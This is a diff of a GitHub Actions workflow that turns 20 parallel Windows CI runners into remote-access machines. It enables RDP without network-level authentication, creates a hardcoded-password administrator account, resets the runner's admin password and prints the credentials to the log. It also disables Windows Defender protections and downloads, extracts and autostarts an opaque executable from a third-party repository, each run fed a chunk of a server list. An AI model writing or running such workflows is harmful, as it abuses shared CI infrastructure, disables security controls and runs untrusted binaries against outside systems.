@@ -1,4 +1,4 @@
-name: Mass Server Deployment (Final)
+name: Mass Server Deployment (Single File Mode)
 
 on:
   workflow_dispatch:
@@ -11,8 +11,8 @@ on:
 jobs:
   deploy:
     strategy:
-      # This allows you to run multiple servers in parallel
       matrix:
+        # This creates the parallel runs
         server_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
       fail-fast: false
 
@@ -36,46 +36,76 @@ jobs:
           
           Write-Host "Initializing Server ID: ${{ matrix.server_id }}" -ForegroundColor Cyan
 
-      - name: 3. Split servers.txt (Config Selection)
+      - name: 3. Split servers.txt (Internal Logic)
         shell: powershell
         run: |
           $maxServers = [int]$env:MAX_SERVERS
           $currentId = [int]$env:SERVER_ID
-          $inputFile = "servers.txt" 
+          $inputFile = "servers.txt" # The ONE big file you uploaded
           $outputFile = "$($env:WORK_DIR)\servers.txt"
-          $linesPerServer = 100 # Adjust this based on your file structure
+          $linesPerServer = 100 # How many lines each server gets
 
           if ($currentId -gt $maxServers) {
-              Write-Host "Skipping Server ID $currentId (Exceeds limit $maxServers)" -ForegroundColor Yellow
+              Write-Host "Skipping Server ID $currentId (Limit: $maxServers)" -ForegroundColor Yellow
               exit 0
           }
 
-          Write-Host "Reading $inputFile for Server ID $currentId..." -ForegroundColor Cyan
+          Write-Host "Reading master $inputFile for Server ID $currentId..." -ForegroundColor Cyan
           
           if (!(Test-Path $inputFile)) {
-              Write-Error "CRITICAL: $inputFile not found in repository!"
+              Write-Error "CRITICAL: $inputFile not found in repository! Upload it!"
               exit 1
           }
 
+          # Read all lines from the big file
           $allLines = Get-Content $inputFile
+          
+          # Calculate the chunk for THIS server
           $startIndex = ($currentId - 1) * $linesPerServer
           $serverLines = $allLines | Select-Object -Skip $startIndex -First $linesPerServer
 
           if ($null -eq $serverLines -or $serverLines.Count -eq 0) {
-              Write-Error "No lines found for Server ID $currentId. Check line count in $inputFile."
+              Write-Error "No lines found for Server ID $currentId. Check your line count."
               exit 1
           }
 
+          # Save the specific chunk as the local servers.txt that the app expects
           $serverLines | Out-File -FilePath $outputFile -Encoding ascii
-          Write-Host "Successfully extracted $currentId config to servers.txt" -ForegroundColor Green
+          Write-Host "Successfully extracted chunk for Server $currentId to servers.txt" -ForegroundColor Green
 
-      - name: 4. Enable Remote Desktop & Firewall
+      - name: 4. Enable RDP & Firewall
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
           Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
 
-      - name: 5. Disable Security & Download App
+      - name: 5. Create Admin Account
+        run: |
+          $Password = ConvertTo-SecureString "P@ssw0rd1qazXSW@#" -AsPlainText -Force
+          New-LocalUser -Name "NvDAdmin" -Password $Password -PasswordNeverExpires -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Administrators" -Member "NvDAdmin" -ErrorAction SilentlyContinue
+          net user runneradmin P@ssw0rd1qazXSW@#
+
+      - name: 6. Install & Connect Tailscale VPN
+        env:
+          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
+        run: |
+          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
+          Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
+          Start-Sleep -Seconds 5
+          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="server-${{ matrix.server_id }}"
+          Start-Sleep -Seconds 8
+          $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
+          
+          Write-Host ""
+          Write-Host "==================================================" -ForegroundColor Green
+          Write-Host "  >>> RDP SERVER READY! <<<" -ForegroundColor Cyan
+          Write-Host "  Tailscale IP : $ts_ip" -ForegroundColor Yellow
+          Write-Host "  Username     : NvdAdmin" -ForegroundColor Yellow
+          Write-Host "  Password     : P@ssw0rd1qazXSW@#" -ForegroundColor Yellow
+          Write-Host "==================================================" -ForegroundColor Green
+
+      - name: 7. Deploy App & Setup Autostart
         shell: powershell
         run: |
           # 1. Disable Security
@@ -85,7 +115,7 @@ jobs:
           Set-MpPreference -DisableBehaviorMonitoring $true
           Set-MpPreference -DisableScriptScanning $true
 
-          # 2. Download Split Zip Files (The Wrapper)
+          # 2. Download Split ZIPs (The Wrapper)
           $filesToDownload = @(
             "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.z01",
             "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.z02",
@@ -93,13 +123,13 @@ jobs:
             "https://raw.githubusercontent.com/roozbeh017-hub/lagi/main/multinl_zip.zip"
           )
 
-          Write-Host "Downloading initial files..." -ForegroundColor Yellow
+          Write-Host "Downloading files..." -ForegroundColor Yellow
           foreach ($url in $filesToDownload) {
               $fileName = Split-Path $url -Leaf
               Invoke-WebRequest -Uri $url -OutFile "$($env:WORK_DIR)\$fileName"
           }
 
-          # 3. Deep Extraction Loop (Recursive)
+          # 3. Deep Extraction Loop
           Write-Host "Starting Aggressive Extraction..." -ForegroundColor Cyan
           $maxIterations = 5
           $iteration = 0
@@ -149,7 +179,7 @@ jobs:
               Write-Host "App 2 (Monitor) configured." -ForegroundColor Green
           }
 
-          # 5. Trigger Immediate Launch
+          # 5. Immediate Launch
           Write-Host "Launching GUI..." -ForegroundColor Yellow
           Start-Process -FilePath $exePath1 -WorkingDirectory $exeDir1 -WindowStyle Normal
 
